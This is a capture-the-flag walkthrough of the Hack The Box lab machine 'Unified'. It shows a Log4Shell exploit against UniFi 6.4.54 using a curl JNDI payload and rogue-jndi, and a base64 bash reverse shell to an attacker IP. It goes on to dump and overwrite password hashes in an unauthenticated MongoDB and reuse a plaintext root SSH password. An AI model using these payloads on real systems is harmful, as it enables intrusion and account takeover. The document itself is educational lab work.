# Unified
#HTB #very-easy #CVE #databases #Web #authentication #privilege-escalation #password-cracking  #java #reverse-shell 
## Target:
*Name:* Unified

*IP:* 10.129.219.164
## Vulnerability:
- The use of old version of UniFi which was vulnerable to Log4shell vulnerability.
- Authentication and authorization were disabled in MongoDB.
## Steps:
#### 1) Reconnaissance
**Code:**
```
nmap -sV 10.129.219.164
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 04:56 -0400
Nmap scan report for 10.129.219.164
Host is up (0.019s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
8443/tcp open  ssl/nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.60 seconds
```
The `?` means nmap isn't sure about the service, we'll check the web interface on port 8080:

<img width="2484" height="1267" alt="image" src="https://github.com/user-attachments/assets/606b36ce-648e-4614-b0f4-d5306c4907c7" />

> [!NOTE]
> UniFi is a software-defined networking ecosystem combining enterprise-grade hardware—such as access points, switches, routers, and security cameras—with a centralized, license-free management interface.

So the actual services running on the machine are :
- **22** — SSH (OpenSSH 8.2p1 Ubuntu) 
- **6789** — UniFi communication port (nmap misidentified as ibm-db2-admin) 
- **8080** — UniFi web interface (HTTP) 
- **8443** — UniFi web interface (HTTPS/SSL)
#### 2) Searching for possible known vulnerabilities
As the web interface revealed the machine is running `Unifi` version `6.4.54`, we can search for vulnerabilities on that specific version.
We found that UniFi Network Application version 6.4.54 is critically vulnerable to the **Log4Shell** remote code execution flaw (CVE-2021-44228), allowing unauthenticated attackers to execute arbitrary code via the login interface.
#### 3) CVE-2021-44228
**CVSS Score:** 10.0 (Critical) — maximum possible severity.

Log4j is a Java logging library, it records events like "user X tried to log in" to a log file. The vulnerability is that Log4j would **interpret** certain strings instead of just logging them. Specifically, if you put `${jndi:ldap://your-ip/payload}` anywhere that gets logged (like a username field, a header, etc.), Log4j would actually **reach out to your server via LDAP** and potentially **execute whatever it finds there**. So instead of logging "login attempt from user `${jndi:ldap://evil.com/x}`", it would connect to `evil.com` and run code — all automatically, with no further interaction needed.
#### 4) Reverse shell
https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
Using the method found, we can get a reverse shell:
**Clone and build rogue-jndi:**
```
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```
**Crafting a command to deliver the reverse shell:**
```
┌──(___________)-[~/rogue-jndi/rogue-jndi]
└─$ echo 'bash -c bash -i >&/dev/tcp/10.10.15.35/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMzUvNDQ0NCAwPiYxCg==
```
With `10.10.15.35` the attacker's machine IP.
**Building the command in rogue-jndi:**
```
java -jar ~/rogue-jndi/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMzUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.15.35"
```
**Start netcat listener:**
```
nc -lvnp 4444
```
**Trigger the exploit via curl:**
```
curl -i -s -k -X POST -H $'Content-Type: application/json' --data-binary $'{"username":"a","password":"a","remember":"${jndi:ldap://10.10.15.35:1389/o=tomcat}","strict":true}' $'https://10.129.219.164:8443/api/login'
```
**Result:**
```
connect to [10.10.15.35] from (UNKNOWN) [10.129.219.164] 37468
id
uid=999(unifi) gid=999(unifi) groups=999(unifi)
```
We successfully connected to the target machine.
#### 5) Searching for user flag
**Full process:**
```
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/home/michael$ cd ..
cd ..
unifi@unified:/home$ cd ..
cd ..
unifi@unified:/$ ls   
ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp    usr
boot  etc  lib   media  opt  root  sbin  sys  unifi  var
unifi@unified:/$ cd home
cd home
unifi@unified:/home$ ls
ls
michael
unifi@unified:/home$ cd michael
cd michael
unifi@unified:/home/michael$ ls
ls
user.txt
unifi@unified:/home/michael$ cat user.txt
cat user.txt
<FLAG>
```
#### 6) MongoDB database
Firstly, we'll check what services are running on the machine locally:
**Code:**
```
ps aux
```
**Result:**
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
unifi          1  0.0  0.0   1080     4 ?        Ss   11:10   0:00 /sbin/docker-
unifi          7  0.0  0.1  18512  3116 ?        S    11:10   0:00 bash /usr/loc
unifi         17  0.8 26.2 3674116 533516 ?      Sl   11:10   1:12 java -Dunifi.
unifi         67  0.3  4.1 1103744 85160 ?       Sl   11:11   0:31 bin/mongod --
unifi       2296  0.0  0.1  18380  3048 ?        S    12:31   0:00 bash -c {echo
unifi       2300  0.0  0.1  18512  3312 ?        S    12:31   0:00 bash -i
unifi       2303  0.0  0.1  18380  3184 ?        S    12:31   0:00 bash
unifi       2783  0.0  0.1  18380  3132 ?        S    12:49   0:00 bash
unifi       2798  0.0  0.1  19312  2324 ?        S    12:49   0:00 script /dev/n
unifi       2799  0.0  0.0   4632   864 pts/0    Ss   12:49   0:00 sh -c bash
unifi       2800  0.0  0.1  18512  3444 pts/0    S    12:49   0:00 bash
unifi       3010  0.0  0.1  18380  3100 ?        S    12:57   0:00 bash -c {echo
unifi       3014  0.0  0.1  18512  3384 ?        S    12:57   0:00 bash -i
unifi       3017  0.0  0.1  18380  3072 ?        S    12:57   0:00 bash
unifi       3031  0.0  0.1  19312  2204 ?        S    12:58   0:00 script /dev/n
unifi       3032  0.0  0.0   4632   812 pts/1    Ss   12:58   0:00 sh -c bash
unifi       3033  0.0  0.1  18512  3472 pts/1    S    12:58   0:00 bash
unifi       3793  0.0  0.1  34408  2948 pts/1    R+   13:27   0:00 ps aux
```

> [!NOTE] 
> *The reverse shell lands inside a Docker container running the UniFi application (1st command in the result indicates it), not directly on the host OS. The container runs as the `unifi` user.*

The most important finding is line 4: `MongoDb` database is running.
The output of the command got cut off, to see the full information, we can use:
```
ps aux | grep mongod
```
**Result:**
```
unifi         67  0.6  4.1 1102720 85204 ?       Sl   22:31   0:01 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
```
That means it is running on port `27117` of local host.
#### 7) Connecting to the database
**Code:**
```
mongo --port 27117
```
**Result:**
```
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2026-08-02T22:40:37.893+0100 I STORAGE  [main] In File::open(), ::open for '/home/unifi/.mongorc.js' failed with No such file or directory
Server has startup warnings: 
2026-08-02T22:31:31.424+0100 I STORAGE  [initandlisten] 
2026-08-02T22:31:31.424+0100 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2026-08-02T22:31:31.424+0100 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2026-08-02T22:31:32.397+0100 I CONTROL  [initandlisten] 
2026-08-02T22:31:32.397+0100 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2026-08-02T22:31:32.397+0100 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2026-08-02T22:31:32.397+0100 I CONTROL  [initandlisten] 
>
```
#### 8) Investigating the database
We first need to know the commands:
```
> help
hehelp
        db.help()                    help on db methods
        db.mycoll.help()             help on collection methods
        sh.help()                    sharding helpers
        rs.help()                    replica set helpers
        help admin                   administrative help
        help connect                 connecting to a db help
        help keys                    key shortcuts
        help misc                    misc things to know
        help mr                      mapreduce

        show dbs                     show database names
        show collections             show collections in current database
        show users                   show users in current database
        show profile                 show most recent system.profile entries with time >= 1ms
        show logs                    show the accessible logger names
        show log [name]              prints out the last segment of log in memory, 'global' is default
        use <db_name>                set current database
        db.foo.find()                list objects in collection foo
        db.foo.find( { a : 1 } )     list objects in foo where a == 1
        it                           result of the last line evaluated; use to further iterate
        DBQuery.shellBatchSize = x   set default number of items to display on shell
        exit                         quit the mongo shell
```
Then, we'll check the available databases:
**Code:**
```
show dbs
```
**Result:**
```
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```
Next, we'll use `ace` database, as it is the only non-empty database:
**Code:**
```
use ace
```
After that, we'll list the collections on `ace` database:
**Code:**
```
show collections
```
**Result:**
```
account
admin
alarm
alert
apgroup
broadcastgroup
crashlog
dashboard
device
dhcpoption
dpiapp
dpigroup
dynamicdns
event
featuremigration
firewallgroup
firewallrule
guest
heatmap
heatmappoint
hotspot2conf
hotspotop
hotspotpackage
ipsalert
map
mediafile
networkconf
payment
portalfile
portconf
portforward
privilege
radiusprofile
rogue
rogueknown
routing
scheduletask
setting
site
spatialrecord
ssooauthtoken
stat
storeddpistats
systemevent
tag
task
user
usergroup
verification
virtualdevice
voucher
wall
wifiman_feedback
wlanconf
wlangroup
```
We found `admin` collection, we'll list it's data using the command:
```
db.admin.find()
```
**Result:**
```
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.", "time_created" : NumberLong(1640900495), "last_site_name" : "default", "ui_settings" : { "neverCheckForUpdate" : true, "statisticsPrefferedTZ" : "SITE", "statisticsPreferBps" : "", "tables" : { "device" : { "sortBy" : "type", "isAscending" : true, "initialColumns" : [ "type", "deviceName", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ], "columns" : [ "type", "deviceName", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "lastSeen", "downlink", "uplink", "dailyUsage", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ] }, "client" : { "sortBy" : "physicalName", "isAscending" : true, "initialColumns" : [ "status", "clientName", "physicalName", "connection", "ip", "experience", "Downlink", "Uplink", "dailyUsage" ], "columns" : [ "status", "clientName", "mac", "physicalName", "connection", "network", "interface", "wifi_band", "ip", "experience", "Downlink", "Uplink", "dailyUsage", "uptime", "channel", "Uplink_apPort", "signal", "txRate", "rxRate", "first_seen", "last_seen", "rx_packets", "tx_packets" ], "filters" : { "status" : { "active" : true }, "connection_type" : { "ng" : true, "na" : true, "wired" : true, "vpn" : true }, "clients_type" : { "users" : true, "guests" : true }, "device" : { "device" : "" } } }, "unifiDevice" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceNetwork" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceAccess" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceProtect" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceTalk" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "insights/wifiScanner" : { "sortBy" : "apCount", "isAscending" : false, "initialColumns" : [ "apCount", "essid", "bssid", "security", "radio", "signal", "channel", "band", "bw", "oui", "date", "ap_mac" ], "columns" : [ "apCount", "essid", "bssid", "security", "radio", "signal", "channel", "band", "bw", "oui", "date", "ap_mac" ] }, "insights/wifiMan" : { "sortBy" : "date", "isAscending" : false, "initialColumns" : [ "clinet_name", "client_wifi_experience", "device_model", "device_name", "wlan_essid", "client_signal", "wlan_channel_width", "down", "up", "endPoint", "rate", "date" ], "columns" : [ "clinet_name", "client_wifi_experience", "device_model", "device_name", "wlan_essid", "client_signal", "wlan_channel_width", "down", "up", "endPoint", "rate", "date" ] } }, "topologyViewSettings" : { "showAllDevices" : true, "showAllClients" : true, "show2GClients" : true, "show5GClients" : true, "showWiredClients" : true, "showSSID" : false, "showWifiExperience" : true, "showRadioChannel" : false, "showWifiStandards" : false, "showWiredSpeed" : false, "showWiredPorts" : false, "online" : true, "offline" : true, "isolated" : true, "pending_adoption" : true, "managed_by_another_console" : true }, "preferences" : { "alertsPosition" : "top_right", "allowHiddenDashboardModules" : false, "browserLogLevel" : "INFO", "bypassAutoFindDevices" : false, "bypassConfirmAdoptAndUpgrade" : false, "bypassConfirmBlock" : false, "bypassConfirmRestart" : false, "bypassConfirmUpgrade" : false, "bypassHybridDashboardNotice" : false, "bypassDashboardUdmProAd" : false, "bypassHybridSettingsNotice" : false, "dateFormat" : "MMM DD YYYY", "dismissWlanOverrides" : false, "enableNewUI" : false, "hideV3SettingsIntro" : true, "isAppDark" : true, "isPropertyPanelFixed" : true, "isRegularGraphForAirViewEnabled" : false, "isResponsive" : false, "isSettingsDark" : true, "isUndockedByDefault" : false, "noWhatsNew" : false, "propertyPanelCollapse" : false, "propertyPanelMultiMode" : true, "refreshButtonEnabled" : false, "refreshRate" : "2MIN", "refreshRateRememberAll" : false, "rowsPerPage" : 50, "showAllPanelActions" : false, "showWifimanAppsBanner" : true, "timeFormat" : "H:mm", "use24HourTime" : true, "useBrowserTheme" : false, "useSettingsPanelView" : false, "websocketEnabled" : true, "withStickyTableActions" : true, "isUlteModalClosed" : false, "isUbbAlignmentToolModalClosed" : false, "offlineClientTimeframe" : 24 }, "preferredLanguage" : "en", "dashboardConfig" : { "lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6" } }, "requires_new_password" : false, "email_alert_enabled" : true, "email_alert_grouping_enabled" : true, "html_email_enabled" : true, "is_professional_installer" : false, "push_alert_enabled" : true }
{ "_id" : ObjectId("61ce4a63fbce5e00116f424f"), "email" : "michael@unified.htb", "name" : "michael", "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0", "requires_new_password" : false, "time_created" : NumberLong(1640909411), "last_site_name" : "default", "email_alert_enabled" : false, "email_alert_grouping_enabled" : false, "email_alert_grouping_delay" : 60, "push_alert_enabled" : false }
{ "_id" : ObjectId("61ce4ce8fbce5e00116f4251"), "email" : "seamus@unified.htb", "name" : "Seamus", "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.", "requires_new_password" : true, "time_created" : NumberLong(1640910056), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d27fbce5e00116f4252"), "email" : "warren@unified.htb", "name" : "warren", "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.", "requires_new_password" : true, "time_created" : NumberLong(1640910119), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d51fbce5e00116f4253"), "email" : "james@unfiied.htb", "name" : "james", "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1", "requires_new_password" : false, "time_created" : NumberLong(1640910161), "last_site_name" : "default" }
```
We found the `administrator` account credentials: 
*Username:* administrator
*Password hash:* `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.`
Since the default database name for UniFi applications is `ace`, that means the credentials found are for administrator UniFi account.
#### 9) Cracking the password
```
┌──(________________)-[~]
└─$ echo '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.' > hashp.txt
                                                                                                                                                                                                   
                                                                                                                                                                                                   
┌──(________________)-[~]
└─$ john hashp.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                           
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```
John couldn't crack the password in a reasonable time.
We can try to update the password in the database.
**Hashing our new password:**
```
┌──(kali㉿kali)-[~]
└─$ mkpasswd -m  sha-512 psswd1                  
$6$4zKE84sD8koj9tp4$4E/XxDya2Ftktde9565N80J4837G7CEvkqxC6wOH/pK1ihKOAguvPJZfS4vFGXbL6htpPyyInMgOfJBgV0HBD0
```
**Changing the `x_shadow` variable:**
```
db.admin.updateOne({name: "administrator"}, {$set: {x_shadow: "$6$4zKE84sD8koj9tp4$4E/XxDya2Ftktde9565N80J4837G7CEvkqxC6wOH/pK1ihKOAguvPJZfS4vFGXbL6htpPyyInMgOfJBgV0HBD0"}})
```
**We verified the update worked:**
```
> db.admin.find({ name: "administrator" })
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$4zKE84sD8koj9tp4$4E/XxDya2Ftktde9565N80J4837G7CEvkqxC6wOH/pK1ihKOAguvPJZfS4vFGXbL6htpPyyInMgOfJBgV0HBD0",
```
We changed the password of `admin` account.
Using the new password, we connected successfully to UniFi `administrator` account:
<img width="2484" height="1185" alt="image" src="https://github.com/user-attachments/assets/f8d16d3f-ad7b-49d2-ac3f-d0af458137b7" />
#### 10) Root flag
<img width="1105" height="378" alt="image" src="https://github.com/user-attachments/assets/64565dc3-07c4-43dc-aaa8-81948a658405" />
The UniFi admin panel's settings revealed plaintext SSH credentials for the root account stored within the application:
*Username:* root
*Password:* `NotACrackablePassword4U2022`

Finally, we'll log in to the target machine as root, via SSH, then we'll find the root flag:
```
┌──(_______________)-[~]
└─$ ssh root@10.129.221.219          
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@10.129.221.219's password: (Entered NotACrackablePassword4U2022)
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

root@unified:~# ls
root.txt
root@unified:~# cat root.txt
<FLAG>
```
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Old software versions may contain publicly known vulnerabilities that can be exploited.
- Misconfigured databases can allow anyone to read and modify data.
- SSH credentials stored in application settings can be reused to access the underlying host OS directly.
